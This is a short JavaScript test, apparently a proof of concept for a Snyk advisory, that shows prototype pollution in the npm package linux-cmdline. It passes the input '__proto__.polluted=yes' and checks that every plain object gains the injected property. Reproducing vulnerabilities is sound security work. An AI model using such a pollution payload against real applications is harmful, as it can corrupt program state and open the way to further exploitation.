//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
test("prototype pollution in linux-cmdline", () => {
  expect({}.polluted).toBe(undefined);

  const linuxCmdline = require("linux-cmdline");
  linuxCmdline("__proto__.polluted=yes");

  expect({}.polluted).toBe("yes");
});
